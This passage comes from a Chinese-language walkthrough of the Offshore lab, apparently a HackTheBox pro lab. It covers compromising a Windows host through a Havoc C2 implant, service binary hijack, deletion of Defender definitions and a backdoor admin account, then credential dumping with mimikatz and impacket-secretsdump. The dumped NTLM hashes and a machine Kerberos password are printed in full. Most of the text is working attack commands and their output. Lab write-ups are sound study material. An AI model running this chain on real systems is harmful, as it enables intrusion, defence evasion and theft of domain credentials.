                                                                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**关键这一行 **`**CORP\Domain Users:(I)(F)**`

含义：

| 标记 | 含义 |
| --- | --- |
| (I) | Inherited（继承权限） |
| (F) | Full Control（完全控制） |


 👉 **Domain Users 对这个 .exe 有完全控制权限**

#### Havoc-C2
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# havoc server --default
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \      
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/      
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │            
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │            
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │            
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\      
    │/     \││/     \│   \_/   (_______)(_______/      

         pwn and elevate until it's done

[INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[INFO] Use default profile
[INFO] Build: 
 - Compiler x64 : /usr/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : /usr/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[INFO] Time: 11/02/2026 13:15:25
[INFO] Teamserver logs saved under: /root/.havoc/data/loot/2026.02.11._13:15:25                               
[INFO] Starting Teamserver on wss://0.0.0.0:40056
[INFO] Opens existing database: /root/.havoc/data/teamserver.db 
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# find /usr -name "*.yaotl" 2>/dev/null

/usr/share/havoc/data/havoc.yaotl
/usr/share/havoc/profiles/webhook_example.yaotl
/usr/share/havoc/profiles/http_smb.yaotl
/usr/share/havoc/profiles/havoc.yaotl

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# cat /usr/share/havoc/profiles/havoc.yaotl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "5pider" {
        Password = "password1234"
    }

    user "Neo" {
        Password = "password1234"
    }
}

# this is optional. if you dont use it you can remove it.
Service {
    Endpoint = "service-endpoint"
    Password = "service-password"
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# havoc client
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \      
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/      
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │            
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │            
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │            
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\      
    │/     \││/     \│   \_/   (_______)(_______/      

         pwn and elevate until it's done

QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
[13:21:09] [info] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[13:21:09] [info] loaded config file: client/config.toml
```

![](/image/prolabs/Offshore-2.png)

![](/image/prolabs/Offshore-3.png)

![](/image/prolabs/Offshore-52.png)

![](/image/prolabs/Offshore-53.png)

存放于C:\Users\ned.flanders_adm\Downloads\demom.exe

![](/image/prolabs/Offshore-54.png)

#### Exploit
```c
sc stop WCAssistantService
copy C:\Users\ned.flanders_adm\Downloads\demom.exe "C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe"
sc start WCAssistantService
```

![](/image/prolabs/Offshore-55.png)

成功拿到system权限，但是很快就被杀了

```c
C:\Users\ned.flanders_adm\Downloads>sc start WCAssistantService
sc start WCAssistantService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

原因是 demom.exe 不是“真正的 Windows 服务程序”

Windows 服务在启动时必须：

+ 调用 `StartServiceCtrlDispatcher`
+ 向 SCM 汇报状态

而你的反弹 shell exe：

+ 只是普通程序
+ 没有服务结构
+ 所以 SCM 等不到响应
+ 10~30 秒后报 1053

##### 方法变更
不要覆盖原文件。

改用：

```c
sc config WCAssistantService binPath= "C:\Users\ned.flanders_adm\Downloads\demom.exe"
```

注意：

`binPath=` 后面必须有一个空格。

这样：

+ Windows 仍然认为它是服务
+ 但执行你的 payload
+ 更稳定

![](/image/prolabs/Offshore-56.png)

然后重新服务

```c
sc start WCAssistantService
```

啧啧啧还是不行

```c
C:\Users\ned.flanders_adm\Downloads>sc start WCAssistantService                                                 
sc start WCAssistantService                             
[SC] StartService FAILED 1053:                          
                                                        
The service did not respond to the start or control request in a timely fashion.
```

那就需要一上线就进行权限维持了

## 权限维持
### shell上线
```c
start "" /b C:\Users\ned.flanders_adm\Downloads\demom.exe
```

解释：

+ `start` = 脱离当前进程
+ `/b` = 后台运行
+ 即使当前 shell 断掉
+ 新进程不会死

```c
12/02/2026 07:38:23 [Neo] Demon » shell start "" /b C:\Users\ned.flanders_adm\Downloads\demom.exe
[*] [D63E907C] Tasked demon to execute a shell command
[+] Send Task to Agent [214 bytes]
```

![](/image/prolabs/Offshore-57.png)

成功上线

### 删除Defentder 病毒库
```c
shell "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## 信息收集
### whoami
```c
12/02/2026 07:44:06 [Neo] Demon » whoami
[*] [F1538E97] Tasked demon to get the info from whoami /all without starting cmd.exe
[+] Send Task to Agent [31 bytes]
[+] Received Output [4463 bytes]:

UserName		SID
====================== ====================================
CORP\WSADM$	S-1-5-18


GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Enabled by default, Enabled group, Group owner, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\System Mandatory Level            Label                    S-1-16-16384                                  Mandatory group, Enabled by default, Enabled group, 


Privilege Name                Description                                       State                         
============================= ================================================= ===========================
SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      
SeLockMemoryPrivilege         Lock pages in memory                              Enabled                       
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      
SeTcbPrivilege                Act as part of the operating system               Enabled                       
SeSecurityPrivilege           Manage auditing and security log                  Disabled                      
SeTakeOwnershipPrivilege      Take ownership of files or other objects          Disabled                      
SeLoadDriverPrivilege         Load and unload device drivers                    Disabled                      
SeSystemProfilePrivilege      Profile system performance                        Enabled                       
SeSystemtimePrivilege         Change the system time                            Disabled                      
SeProfileSingleProcessPrivilegeProfile single process                            Enabled                       
SeIncreaseBasePriorityPrivilegeIncrease scheduling priority                      Enabled                       
SeCreatePagefilePrivilege     Create a pagefile                                 Enabled                       
SeCreatePermanentPrivilege    Create permanent shared objects                   Enabled                       
SeBackupPrivilege             Back up files and directories                     Disabled                      
SeRestorePrivilege            Restore files and directories                     Disabled                      
SeShutdownPrivilege           Shut down the system                              Disabled                      
SeDebugPrivilege              Debug programs                                    Enabled                       
SeAuditPrivilege              Generate security audits                          Enabled                       
SeSystemEnvironmentPrivilege  Modify firmware environment values                Disabled                      
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
SeUndockPrivilege             Remove computer from docking station              Disabled                      
SeManageVolumePrivilege       Perform volume maintenance tasks                  Disabled                      
SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       
SeCreateGlobalPrivilege       Create global objects                             Enabled                       
SeIncreaseWorkingSetPrivilege Increase a process working set                    Enabled                       
SeTimeZonePrivilege           Change the time zone                              Enabled                       
SeCreateSymbolicLinkPrivilege Create symbolic links                             Enabled                       
SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionEnabled         
```

### net localgroup administrators
```c
12/02/2026 07:49:44 [Neo] Demon » shell net localgroup administrators
[*] [6E4FB32C] Tasked demon to execute a shell command
[+] Send Task to Agent [158 bytes]
[+] Received Output [322 bytes]:
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
CORP\Domain Admins
CORP\wsadmin
justalocaladmin
The command completed successfully.
```

 👉 **列出当前机器“本地管理员组（Administrators）”里的所有成员**

以下账户拥有这台机器的本地管理员权限 👇

| **账户** | **说明** |
| --- | --- |
| **Administrator** | **本地管理员账户** |
| **CORP\Domain Admins** | **域管理员组（域控里的高权限组）** |
| **CORP\wsadmin** | **域用户 wsadmin** |
| **justalocaladmin** | **本地创建的管理员账户** |


### query user
```c
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 wsadmin                                   1  Disc           38  2/11/2026 10:31 PM
 ned.flanders_adm      rdp-tcp#0           2  Active          9  2/12/2026 7:09 AM
```

**查看当前机器上的登录会话情况**，可以发现wsadmin  → Disc

说明：

👉 这个用户之前登录过  
👉 但现在没有活动

#### tscon
##### 指令
```c
tscon <源会话ID> /dest:<目标终端>
```

#### 尝试一
```c
12/02/2026 09:16:35 [Neo] Demon » shell tscon 1 /dest:rdp-tcp#0
[*] [1250FA6E] Tasked demon to execute a shell command
[+] Send Task to Agent [146 bytes]
```

解释：

+ Session ID 1 → wsadmin（断开状态）
+ rdp-tcp#44 → 你当前的 RDP 会话

意思是：

👉 把 Session ID 1(wsadmin)连接到 rdp-tcp#44 (我当前的 RDP 窗口)

但是发现需要密码....???

![](/image/prolabs/Offshore-58.png)

 因为 Windows 10 的 RDP 会话“重绑定”默认需要重新认证。  

#### 尝试二
在ned.flanders_adm的rdp会话中

```c
tscon 1 /dest:rdp-tcp#0
```

解释：

+ Session ID 1 → wsadmin（断开状态）
+ rdp-tcp#44 → 你当前的 RDP 会话

意思是：

👉 把 Session ID 1(wsadmin)连接到 rdp-tcp#44 (我当前的 RDP 窗口)

但是报错了

```c
Could not connect sessionID 1 to sessionname rdp-tcp#0, Error code 1326
Error [1326]:The user name or password is incorrect.
```

##### 报错原因
```c
query session / query user

适用于
Windows Server 2022
Windows Server 2019
Windows Server 2016
Windows Server 2012 R2
Windows Server 2012 
```

由于我们当前是win10，所以没办法直接接管

 ( Windows 10 的 RDP 会话“重绑定”默认需要重新认证。)

需要通过

+ SYSTEM 权限
+ 或特殊策略允许

#### 尝试三
```c
直接加用户然后rdp

net user hacker Passw@rd! /add
net localgroup administrators hacker /add
```

先上传psexec

```c
psexec -s cmd.exe 
>whoami
>>nt authority\system

tscon 1 /dest:rdp-tcp#45
```

还是需要密码

### Getflag
![](/image/prolabs/Offshore-59.png)

```c
┌──(kali㉿kali)-[~]
└─$ cat /home/kali/Desktop/tools/Havoc/data/loot/2026.02.12._06:58:59/agents/3e1ecfd2/Download/C:/Users/wsadmin/Desktop/flag.txt

OFFSHORE{4t_y0ur_5erv1ce}   
```

### Mimikatz
```c
C:\Users\ned.flanders_adm\Downloads\mimikatz.exe
```

```c
12/02/2026 08:08:23 [Neo] Demon » shell C:\Users\ned.flanders_adm\Downloads\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
[*] [A60E29BC] Tasked demon to execute a shell command
[+] Send Task to Agent [298 bytes]
[+] Received Output [4118 bytes]:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 6079127 (00000000:005cc297)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2026 7:09:57 AM
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6079108 (00000000:005cc284)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2026 7:09:57 AM
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6074402 (00000000:005cb022)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2026 7:09:57 AM
SID               : S-1-5-96-0-3
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6038216 (00000000:005c22c8)
Session           : RemoteInteractive from 2
User Name         : ned.flanders_adm
Domain            : CORP
Logon Server      : DC01
Logon Time        : 2/12/2026 7:09:20 AM
SID               : S-1-5-21-2291914956-3290296217-2402366952-3604
	msv :	
	 [00000003] Primary
	 * Username : ned.flanders_adm
	 * Domain   : CORP
	 * NTLM     : deff72637376f94d8e6c3fab3270f65d
	 * SHA1     : 60a145c0c5f8a58127ce8a65fde2ec5b7761a777
	 * DPAPI    : e02244464259fb3c9e4a177d90d72d47
	tspkg :	
	wdigest :	
	 * Username : ned.flanders_adm
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ned.flanders_adm
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 5991776 (00000000:005b6d60)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2026 7:09:19 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : 
[+] Received Output [4097 bytes]:
(null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 5990945 (00000000:005b6a21)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2026 7:09:19 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 5987056 (00000000:005b5af0)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2026 7:09:19 AM
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 521838 (00000000:0007f66e)
Session           : Interactive from 1
User Name         : wsadmin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 2/11/2026 10:31:32 PM
SID               : S-1-5-21-2291914956-3290296217-2402366952-1820
	msv :	
	 [00000003] Primary
	 * Username : wsadmin
	 * Domain   : CORP
	 * NTLM     : 669b12a3bac275251170afbe2c5de8c2
	 * SHA1     : 62e3e767c5d2ad6521d8d3e0e672e299437ed666
	 * DPAPI    : 41aff401de68a7ae9e94bdb6907dddb2
	tspkg :	
	wdigest :	
	 * Username : wsadmin
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : wsadmin
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 521695 (00000000:0007f5df)
Session           : Interactive from 1
User Name         : wsadmin
Domain            : CORP
Logon Server      : DC01
Logon Time        : 2/11/2026 10:31:32 PM
SID               : S-1-5-21-2291914956-3290296217-2402366952-1820
	msv :	
	 [00000003] Primary
	 * Username : wsadmin
	 * Domain   : CORP
	 * NTLM     : 669b12a3bac275251170afbe2c5de8c2
	 * SHA1     : 62e3e767c5d2ad6521d8d3e0e672e299437ed666
	 * DPAPI    : 41aff401de68a7ae9e94bdb6907dddb2
	tspkg :	
	wdigest :	
	 * Username : wsadmin
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : wsadmin
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:56 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 77401 (00000000:00012e59)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:55 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfd
[+] Received Output [4103 bytes]:
c064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 77383 (00000000:00012e47)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:55 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WSADM$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:55 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : wsadm$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 45915 (00000000:0000b35b)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:54 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 45914 (00000000:0000b35a)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:54 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : WSADM$
	 * Domain   : corp.local
	 * Password : M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 44838 (00000000:0000af26)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:54 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WSADM$
	 * Domain   : CORP
	 * NTLM     : 19f221a69c0693ebfdc064393b55d509
	 * SHA1     : ef3a26edd7e7533956cd121ad45839b7f8e58df9
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WSADM$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/11/2026 10:30:53 PM
SID               : S-1-5-18
[+] Received Output [262 bytes]:

	msv :	
	tspkg :	
	wdigest :	
	 * Username : WSADM$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : wsadm$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

mimikatz(commandline) # exit
Bye!
```

当然这一步也可以使用 samdump ，二者择其一即可

### samdump
#### mimi和sam对比总结
**samdump = 读磁盘里的 SAM 文件（本地账户 hash）**  
**mimikatz = 读内存里的 LSASS（明文 / 域凭据 / 票据）**

| **对比项** | **samdump** | **mimikatz** |
| --- | --- | --- |
| **读取位置** | **磁盘（SAM）** | **内存（LSASS）** |
| **是否需要 SYSTEM** | **建议** | **强烈需要** |
| **能抓域账号吗** | ❌ | ✅ |
| **能抓明文吗** | ❌ | ✅ |
| **能抓 Kerberos** | ❌ | ✅ |
| **危险程度** | **低** | **非常高** |
| **杀软敏感度** | **低** | **非常高** |


#### ✅ 第一步：保存 hive
在 SYSTEM shell 里：

```plain
reg save HKLM\SAM C:\Users\Public\sam.save
reg save HKLM\SYSTEM C:\Users\Public\system.save
```

成功会提示：

```plain
The operation completed successfully.
```

---

#### ✅ 第二步：下载文件
在 Havoc 里：

```plain
download C:\Users\Public\sam.save
download C:\Users\Public\system.save
```

---

#### ✅ 第三步：在 Kali 上解析
##### 用 impacket本地解析：
```plain
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

##### 用 impacket远程解析：
```plain
impacket-secretsdump 用户名:密码@目标IP
```

```plain
net user hacker Passw@rd! /add
net localgroup administrators hacker /add
```

```plain
proxychains impacket-secretsdump 'hacker:Passw@rd@172.16.1.36'
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Cleaning up... 
```

###### 报错原因
即便本地账号在 Administrators 组里，

**通过网络登录时会被 UAC 过滤成普通用户权限。**

这就是：

SMB 登录成功

但 RemoteOperations 拒绝的原因。

这是 Windows 的安全机制（LocalAccountTokenFilterPolicy）。

###### 解决报错
```plain
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

```plain
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-secretsdump ./hacker:'Passw@rd!'@172.16.1.36

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0227171ea0ee09d093667b75d0fadb90
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3802cf5095540b577e479ab90ace06cc:::
justalocaladmin:1002:aad3b435b51404eeaad3b435b51404ee:ecc47db5f4b0a6b3ca062361f9b3ef8f:::
hacker:1005:aad3b435b51404eeaad3b435b51404ee:bec28a3aa11811760131128a6b8b8833:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/iamtheadministrator:$DCC2$10240#iamtheadministrator#d1a7a1c8c1da5a83f859dc27180e0076: (2020-03-01 19:38:44+00:00)
CORP.LOCAL/ned.flanders_adm:$DCC2$10240#ned.flanders_adm#f29265de0b0a15746aaba163f152d716: (2026-02-12 12:09:20+00:00)
CORP.LOCAL/wsadmin:$DCC2$10240#wsadmin#fd88913b9ecd31d42d450b4c92df1c7c: (2026-02-12 03:31:33+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\WSADM$:aes256-cts-hmac-sha1-96:b0fa3c9f02819aed4caa87016604692607ddc48c2ea69c25d1106aeeaf37cd02
CORP\WSADM$:aes128-cts-hmac-sha1-96:29aebdea1164ad4ca01f1159cf1ae7cc
